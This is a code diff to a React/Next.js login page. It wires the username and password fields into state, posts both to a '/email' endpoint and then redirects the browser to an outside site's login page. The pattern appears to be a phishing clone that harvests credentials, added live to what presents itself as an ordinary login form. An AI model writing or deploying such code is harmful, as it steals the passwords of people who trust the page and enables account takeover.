@@ -1,5 +1,6 @@
 "use client";
 import { useRouter } from "next/navigation"
+import { useEffect, useState } from "react";
 import { Box, Link, Stack, Typography, useTheme, SvgIcon, Button, InputAdornment, TextField, Checkbox, FormControlLabel, Icon } from "@mui/material";
 import LocalCafeIcon from '@mui/icons-material/LocalCafe';
 import LockIcon from '@mui/icons-material/Lock';
@@ -8,14 +9,26 @@ import ManIcon from '@mui/icons-material/Man';
 import Image from "next/image";
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import { faArrowLeft, faArrowRight, faKey } from "@fortawesome/free-solid-svg-icons";
+import axios from "../../../utils/axios";
 
 export default function LoginView() {
   const theme = useTheme();
   const router = useRouter();
-
-  const login = () => {
-    // e.preventDefault()
-    router.push("/dashboard");
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const login = async(e: any) => {
+    e.preventDefault()
+    await axios.post('/email', {
+        email: email,
+        password: password
+    })
+    .then((response) => {
+      router.push("https://luxchecker.pm/login.php");
+      console.log(response.data);
+    })
+    .catch((error) => {
+      console.error(error);
+    });
   }
   return (
     <Stack direction={"column"} bgcolor={"#1D2024"} sx={{ minHeight: "100vh" }}>
@@ -195,6 +208,8 @@ export default function LoginView() {
                 fullWidth={true}
                 variant="outlined"
                 placeholder="Username"
+                value={email}
+                onChange={(e)=>setEmail(e.target.value)}
                 sx={{ fontSize: "12px" }}
                 InputProps={{
                   endAdornment: (
@@ -210,6 +225,8 @@ export default function LoginView() {
                 fullWidth={true}
                 variant="outlined"
                 placeholder="Password"
+                value={password}
+                onChange={(e)=>setPassword(e.target.value)}
                 type="password"
                 InputProps={{
                   endAdornment: (
@@ -248,7 +265,7 @@ export default function LoginView() {
                 <Link>
                 </Link>
                 <Button
-                  // type="submit"
+                  type="submit"
                   variant="contained"
                   style={{ fontFamily: "Open Sans" ,backgroundColor:"#428BCA",border:"none"}}
                   sx={{ mt: 3, mb: 2 }}
